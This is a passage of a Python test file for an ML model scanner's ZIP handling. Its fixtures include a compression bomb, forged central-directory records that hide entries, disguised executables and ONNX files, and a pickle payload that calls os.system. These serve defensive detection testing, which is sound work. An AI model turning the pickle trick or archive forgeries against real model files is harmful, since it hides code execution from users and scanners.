        assert compression_checks[0].details["min_uncompressed_size"] == 1024 * 1024

    def test_configured_skip_entry_is_incomplete_and_not_recursively_scanned(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "owned-entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("metadata.json", b'{"owned": true}')
            archive.writestr("payload.bin", b"payload")

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            result = ScanResult(scanner_name="test")
            result.finish(success=True)
            return result

        scanner = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                "skip_archive_entries": ["metadata.json"],
            }
        )
        result = scanner.scan(str(archive_path))

        assert result.success is False
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "ZIP Member Analysis Coverage"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "metadata.json"
            for check in result.checks
        )
        assert not any(path.endswith("_metadata.json") for path in nested_scan_paths)
        assert any(path.endswith("_payload.bin") for path in nested_scan_paths)

    def test_security_only_entry_preserves_generic_security_scan_without_nested_dispatch(
        self,
        tmp_path: Path,
    ) -> None:
        archive_path = tmp_path / "security-only-executable.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.weights.h5", b"\x7fELF" + (b"\x00" * 64))

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            result = ScanResult(scanner_name="test")
            result.finish(success=True)
            return result

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["model.weights.h5"],
            }
        ).scan(str(archive_path))

        assert nested_scan_paths == []
        assert any(
            check.name == "Executable Archive Member Detection"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "model.weights.h5"
            for check in result.checks
        )
        assert result.metadata["contents"] == [
            {
                "path": f"{archive_path}:model.weights.h5",
                "type": "security_only",
                "size": 68,
            }
        ]

    def test_security_only_benign_entry_stays_clean_without_nested_dispatch(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "security-only-benign.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.weights.h5", b"\x89HDF\r\n\x1a\n" + (b"\x00" * 64))

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            result = ScanResult(scanner_name="test")
            result.finish(success=True)
            return result

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                ZIP_SECURITY_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["model.weights.h5"],
            }
        ).scan(str(archive_path))

        assert nested_scan_paths == []
        assert not any(
            check.name == "Executable Archive Member Detection" and check.status == CheckStatus.FAILED
            for check in result.checks
        )
        assert result.metadata["contents"] == [
            {
                "path": f"{archive_path}:model.weights.h5",
                "type": "security_only",
                "size": 72,
            }
        ]

    def test_content_only_entry_dispatches_without_untrusted_suffix(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "content-only.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.weights.h5", b"content-routed payload")

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            result = ScanResult(scanner_name="test")
            result.finish(success=True)
            return result

        result = ZipScanner(
            config={
                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
                ZIP_CONTENT_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["model.weights.h5"],
            }
        ).scan(str(archive_path))

        assert len(nested_scan_paths) == 1
        assert Path(nested_scan_paths[0]).suffix == ""
        assert result.metadata["contents"] == [
            {
                "path": f"{archive_path}:model.weights.h5",
                "type": "test",
                "size": 22,
            }
        ]

    def test_zip_bomb_detection_skips_only_suspicious_entry(self, tmp_path: Path) -> None:
        """Suspicious entries should be skipped while safe entries still route to nested scanning."""
        archive_path = tmp_path / "mixed.zip"
        with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("suspicious.txt", "A" * (2 * 1024 * 1024))
            z.writestr("safe.bin", os.urandom(4096))

        nested_scan_paths: list[str] = []

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_scan_paths.append(path)
            return ScanResult(scanner_name="test")

        scanner = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan})
        result = scanner.scan(str(archive_path))

        assert result.success is False
        assert not any(path.endswith("_suspicious.txt") for path in nested_scan_paths)
        assert any(path.endswith("_safe.bin") for path in nested_scan_paths)

        compression_issues = [i for i in result.issues if i.rule_code == "S410"]
        assert len(compression_issues) == 1
        assert compression_issues[0].details["entry"] == "suspicious.txt"

    def test_nested_zip_dispatch_does_not_route_generic_bin_zip_to_pickle(self, tmp_path: Path) -> None:
        """A generic ZIP archive named .bin should not be forced through pickle routing."""
        archive_path = tmp_path / "weights.bin"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("metadata.txt", "not a pickle")

        assert _select_nested_scanner_id(str(archive_path)) == "zip"

    def test_nested_member_routes_misnamed_onnx_by_header(self, tmp_path: Path) -> None:
        """A model header should route nested members even when their suffix is generic."""
        pytest.importorskip("onnx")
        archive_path = tmp_path / "outer.zip"
        onnx_path = create_mock_onnx(tmp_path / "model.onnx")
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.payload", onnx_path.read_bytes())

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:model.payload" and entry["type"] == "onnx"
            for entry in result.metadata["contents"]
        )

    def test_nested_member_routes_prefixed_misnamed_onnx_by_structure(self, tmp_path: Path) -> None:
        """Unknown leading protobuf content must not hide a nested ONNX member."""
        pytest.importorskip("onnx")
        archive_path = tmp_path / "outer.zip"
        onnx_path = create_mock_onnx(tmp_path / "model.onnx", op_type="PythonOp")
        prefix_mock_onnx_with_unknown_field(onnx_path, value_size=(1024 * 1024) + 32)
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.jpg", onnx_path.read_bytes())

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:model.jpg" and entry["type"] == "onnx"
            for entry in result.metadata["contents"]
        )
        assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)

    def test_nested_member_routes_group_budget_prefixed_misnamed_onnx(self, tmp_path: Path) -> None:
        """A bounded legal group prefix must not hide malicious nested ONNX."""
        pytest.importorskip("onnx")
        archive_path = tmp_path / "outer.zip"
        onnx_path = create_mock_onnx(tmp_path / "model.onnx", op_type="PythonOp")
        prefix_mock_onnx_with_unknown_group(onnx_path)
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.jpg", onnx_path.read_bytes())

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:model.jpg" and entry["type"] == "onnx"
            for entry in result.metadata["contents"]
        )
        assert any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)

    def test_nested_declared_onnx_candidate_keeps_extension_owner_when_dependency_missing(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A declared nested .onnx keeps normal ONNX ownership even with ambiguous magic."""
        pytest.importorskip("onnx")
        archive_path = tmp_path / "outer.zip"
        onnx_path = create_mock_onnx(tmp_path / "model.onnx")
        prefix_mock_onnx_with_unknown_group(onnx_path)
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.onnx", onnx_path.read_bytes())

        monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:model.onnx" and entry["type"] == "onnx"
            for entry in result.metadata["contents"]
        )
        assert any(check.name == "ONNX Capability Check" for check in result.checks)
        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
        assert not any(check.name == "ONNX Candidate Analysis" for check in result.checks)

    def test_nested_member_does_not_route_prefixed_generic_protobuf_as_onnx(self, tmp_path: Path) -> None:
        """An unknown protobuf prefix alone must not promote a nested member."""
        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("metadata.jpg", b"\xa2\x06\x04xxxx\x12\x02\x08\x01")

        result = self.scanner.scan(str(archive_path))

        assert any(
            entry["path"] == f"{archive_path}:metadata.jpg" and entry["type"] == "unknown"
            for entry in result.metadata["contents"]
        )
        assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)

    def test_max_depth_limit(self):
        """Test that maximum nesting depth is enforced"""
        # Create deeply nested zips
        current_path = None
        paths_to_delete = []

        try:
            # Create 10 levels of nested zips
            for i in range(10):
                with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
                    with zipfile.ZipFile(tmp.name, "w") as z:
                        if current_path:
                            z.write(current_path, f"level{i}.zip")
                        else:
                            z.writestr("deepest.txt", "Deep content")
                    paths_to_delete.append(tmp.name)
                    current_path = tmp.name

            # Scan the outermost zip
            assert current_path is not None  # Should be set by the loop above
            scanner = ZipScanner(config={"max_zip_depth": 3})
            result = scanner.scan(current_path)

            assert result.success is False
            depth_issues = [i for i in result.issues if "depth" in i.message.lower()]
            assert len(depth_issues) >= 1
            assert depth_issues[0].severity == IssueSeverity.WARNING
            assert depth_issues[0].rule_code == "S410"
            assert "zip_depth_limit" in result.metadata["scan_outcome_reasons"]
        finally:
            for path in paths_to_delete:
                if os.path.exists(path):
                    os.unlink(path)

    def test_max_entries_limit_fails_closed_on_partial_scan(self, tmp_path: Path) -> None:
        """Entry-count truncation should make the archive scan unsuccessful."""
        archive_path = tmp_path / "many_entries.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        result = ZipScanner(config={"max_zip_entries": 1}).scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and "too many entries" in check.message.lower()
            for check in result.checks
        )
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["analysis_incomplete"] is True
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]

    def test_max_entries_limit_preflight_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """EOCD entry counts should fail closed before ZipFile parses the central directory."""
        archive_path = tmp_path / "preflight_many_entries.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("entry-count preflight should stop before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner(config={"max_zip_entries": 1}).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert result.metadata["zip_entry_count_preflight"] == 2
        assert "zip_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and check.rule_code == "S410"
            and check.details["entries"] == 2
            and check.details["max_entries"] == 1
            and check.details["entry_count_source"] == "central_directory_preflight"
            for check in result.checks
        )

    def test_central_directory_size_limit_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "oversized_directory.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_bytes = archive_path.read_bytes()
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[eocd_index + 12 : eocd_index + 16], "little")

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("directory-size preflight should stop before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner(config={"max_zip_central_directory_size": directory_size - 1}).scan(str(archive_path))

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert any(
            check.name == "Central Directory Size Limit Check"
            and check.status == CheckStatus.FAILED
            and check.rule_code == "S410"
            and check.details["central_directory_size"] == directory_size
            and check.details["max_central_directory_size"] == directory_size - 1
            for check in result.checks
        )

    def test_central_directory_size_exact_limit_still_scans(self, tmp_path: Path) -> None:
        archive_path = tmp_path / "directory_at_limit.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("safe.txt", "safe")

        archive_bytes = archive_path.read_bytes()
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[eocd_index + 12 : eocd_index + 16], "little")

        result = ZipScanner(config={"max_zip_central_directory_size": directory_size}).scan(str(archive_path))

        assert result.success is True
        assert not any(check.name == "Central Directory Size Limit Check" for check in result.checks)

    def test_central_directory_size_limit_cannot_be_raised(self) -> None:
        assert (
            ZipScanner.central_directory_size_limit(
                {"max_zip_central_directory_size": ZipScanner.DEFAULT_MAX_CENTRAL_DIRECTORY_SIZE * 2}
            )
            == ZipScanner.DEFAULT_MAX_CENTRAL_DIRECTORY_SIZE
        )

    def test_oversized_directory_with_valid_empty_eocd_fails_ambiguous_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "oversized_with_empty_eocd.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')

        archive_bytes = bytearray(archive_path.read_bytes())
        real_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert real_eocd_index >= 0
        fake_empty_eocd = b"PK\x05\x06" + (b"\x00" * 18)
        archive_bytes[real_eocd_index + 20 : real_eocd_index + 22] = len(fake_empty_eocd).to_bytes(2, "little")
        archive_bytes.extend(fake_empty_eocd)
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("ambiguous oversized directories must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner(config={"max_zip_central_directory_size": 1}).scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Central Directory Size Limit Check" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_max_entries_limit_forged_low_eocd_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A low forged EOCD count must not hide additional central-directory records."""
        archive_path = tmp_path / "forged_low_count.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        archive_bytes = bytearray(archive_path.read_bytes())
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("forged EOCD count must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner(config={"max_zip_entries": 1}).scan(str(archive_path))

        assert result.success is False
        assert result.metadata["zip_entry_count_preflight"] == 2
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and check.details["entry_count_source"] == "central_directory_preflight"
            for check in result.checks
        )

    @pytest.mark.parametrize("forged_prefix_shift", [0, 1])
    def test_suffix_only_central_directory_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        forged_prefix_shift: int,
    ) -> None:
        archive_path = tmp_path / "suffix_only_directory.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[eocd_index + 12 : eocd_index + 16], "little")
        directory_start = eocd_index - directory_size
        last_record_start = archive_bytes.rfind(b"PK\x01\x02", directory_start, eocd_index)
        assert last_record_start > directory_start
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = (last_record_start - forged_prefix_shift).to_bytes(
            4,
            "little",
        )
        if forged_prefix_shift:
            safe_local_offset = int.from_bytes(archive_bytes[last_record_start + 42 : last_record_start + 46], "little")
            archive_bytes[last_record_start + 42 : last_record_start + 46] = (
                safe_local_offset - forged_prefix_shift
            ).to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("suffix-only directories must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_suffix_only_directory_with_corrupted_omitted_record_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "suffix_only_corrupted_directory.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[eocd_index + 12 : eocd_index + 16], "little")
        directory_start = eocd_index - directory_size
        last_record_start = archive_bytes.rfind(b"PK\x01\x02", directory_start, eocd_index)
        assert last_record_start > directory_start
        archive_bytes[directory_start : directory_start + 2] = b"XX"
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = last_record_start.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("unreferenced local entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_suffix_only_directory_with_corrupted_omitted_record_metadata_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "suffix_only_corrupted_directory_metadata.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[eocd_index + 12 : eocd_index + 16], "little")
        directory_start = eocd_index - directory_size
        last_record_start = archive_bytes.rfind(b"PK\x01\x02", directory_start, eocd_index)
        assert last_record_start > directory_start
        archive_bytes[directory_start : directory_start + 4] = b"XXXX"
        archive_bytes[directory_start + 6 : directory_start + 8] = (101).to_bytes(2, "little")
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = last_record_start.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("unreferenced local entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_suffix_only_directory_with_deleted_omitted_record_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "suffix_only_deleted_directory_record.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        original_directory_size = int.from_bytes(
            archive_bytes[original_eocd_index + 12 : original_eocd_index + 16],
            "little",
        )
        directory_start = original_eocd_index - original_directory_size
        last_record_start = archive_bytes.rfind(b"PK\x01\x02", directory_start, original_eocd_index)
        assert last_record_start > directory_start
        del archive_bytes[directory_start:last_record_start]
        eocd_index = original_eocd_index - (last_record_start - directory_start)
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - directory_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = directory_start.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("unreferenced local entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_empty_directory_cannot_hide_unreferenced_local_entry(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "empty_directory_hides_local_entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[original_eocd_index + 12 : original_eocd_index + 16], "little")
        directory_start = original_eocd_index - directory_size
        del archive_bytes[directory_start:original_eocd_index]
        eocd_index = directory_start
        archive_bytes[eocd_index + 8 : eocd_index + 12] = b"\x00" * 4
        archive_bytes[eocd_index + 12 : eocd_index + 16] = b"\x00" * 4
        archive_bytes[eocd_index + 16 : eocd_index + 20] = eocd_index.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("empty forged directories must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_deleted_omitted_record_with_local_padding_rejects_before_zipfile_open(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        archive_path = tmp_path / "deleted_record_with_local_padding.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("payload.pkl", b'cos\nsystem\n(S"echo hidden"\ntR.')
            archive.writestr("safe.txt", "safe")

        archive_bytes = bytearray(archive_path.read_bytes())
        original_eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert original_eocd_index >= 0
        directory_size = int.from_bytes(archive_bytes[original_eocd_index + 12 : original_eocd_index + 16], "little")
        directory_start = original_eocd_index - directory_size
        last_record_start = archive_bytes.rfind(b"PK\x01\x02", directory_start, original_eocd_index)
        assert last_record_start > directory_start
        safe_local_offset = int.from_bytes(archive_bytes[last_record_start + 42 : last_record_start + 46], "little")
        removed_size = last_record_start - directory_start
        del archive_bytes[directory_start:last_record_start]
        archive_bytes[safe_local_offset:safe_local_offset] = b"X"
        last_record_start = directory_start + 1
        eocd_index = original_eocd_index - removed_size + 1
        archive_bytes[last_record_start + 42 : last_record_start + 46] = (safe_local_offset + 1).to_bytes(4, "little")
        archive_bytes[eocd_index + 8 : eocd_index + 10] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 10 : eocd_index + 12] = (1).to_bytes(2, "little")
        archive_bytes[eocd_index + 12 : eocd_index + 16] = (eocd_index - last_record_start).to_bytes(4, "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = last_record_start.to_bytes(4, "little")
        archive_path.write_bytes(archive_bytes)

        def fail_zipfile_open(*_args: Any, **_kwargs: Any) -> Any:
            raise AssertionError("padded hidden local entries must fail before ZipFile construction")

        monkeypatch.setattr(zip_scanner_module.zipfile, "ZipFile", fail_zipfile_open)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Central Directory Preflight"
            and check.status == CheckStatus.FAILED
            and "omits a preceding record" in check.message
            for check in result.checks
        )

    def test_force_zip64_streamed_entry_uses_local_descriptor_width(self, tmp_path: Path) -> None:
        class NonSeekableBuffer(io.BytesIO):
            def seek(self, *_args: Any, **_kwargs: Any) -> int:
                raise io.UnsupportedOperation("not seekable")

            def seekable(self) -> bool:
                return False

        archive_buffer = NonSeekableBuffer()
        with (
            zipfile.ZipFile(archive_buffer, "w") as archive,
            archive.open("safe.txt", "w", force_zip64=True) as member,
        ):
            member.write(b"safe")

        archive_path = tmp_path / "force_zip64_streamed.zip"
        archive_bytes = bytearray(archive_buffer.getvalue())
        local_header = archive_bytes.find(b"PK\x03\x04")
        assert local_header >= 0
        archive_bytes[local_header + 18 : local_header + 26] = b"\x00" * 8
        archive_path.write_bytes(archive_bytes)

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_partial_zip64_streamed_entry_uses_64bit_descriptor_width(self, tmp_path: Path) -> None:
        class NonSeekableBuffer(io.BytesIO):
            def seek(self, *_args: Any, **_kwargs: Any) -> int:
                raise io.UnsupportedOperation("not seekable")

            def seekable(self) -> bool:
                return False

        archive_buffer = NonSeekableBuffer()
        with (
            zipfile.ZipFile(archive_buffer, "w") as archive,
            archive.open("archive/data/0", "w", force_zip64=True) as member,
        ):
            member.write(b"safe")

        archive_bytes = bytearray(archive_buffer.getvalue())
        local_header = archive_bytes.find(b"PK\x03\x04")
        assert local_header >= 0
        filename_size = int.from_bytes(archive_bytes[local_header + 26 : local_header + 28], "little")
        extra_size = int.from_bytes(archive_bytes[local_header + 28 : local_header + 30], "little")
        extra_start = local_header + 30 + filename_size
        assert archive_bytes[extra_start : extra_start + 2] == b"\x01\x00"
        assert int.from_bytes(archive_bytes[extra_start + 2 : extra_start + 4], "little") == 16

        del archive_bytes[extra_start + 12 : extra_start + 20]
        archive_bytes[extra_start + 2 : extra_start + 4] = (8).to_bytes(2, "little")
        archive_bytes[local_header + 18 : local_header + 26] = b"\x00" * 8
        archive_bytes[local_header + 28 : local_header + 30] = (extra_size - 8).to_bytes(2, "little")

        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
        assert eocd_index >= 0
        directory_offset = int.from_bytes(archive_bytes[eocd_index + 16 : eocd_index + 20], "little")
        archive_bytes[eocd_index + 16 : eocd_index + 20] = (directory_offset - 8).to_bytes(4, "little")

        archive_path = tmp_path / "partial-zip64-streamed.zip"
        archive_path.write_bytes(archive_bytes)

        assert not ZipScanner.requires_preflight_result(
            str(archive_path),
            ZipScanner.DEFAULT_MAX_ENTRIES,
            ZipScanner.central_directory_size_limit({}),
        )

        result = ZipScanner().scan(str(archive_path))

        assert result.success is True
        assert not any(
            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
            for check in result.checks
        )

    def test_force_zip64_streamed_entry_rejects_invalid_64bit_descriptor(self, tmp_path: Path) -> None:
        class NonSeekableBuffer(io.BytesIO):
            def seek(self, *_args: Any, **_kwargs: Any) -> int:
                raise io.UnsupportedOperation("not seekable")

            def seekable(self) -> bool:
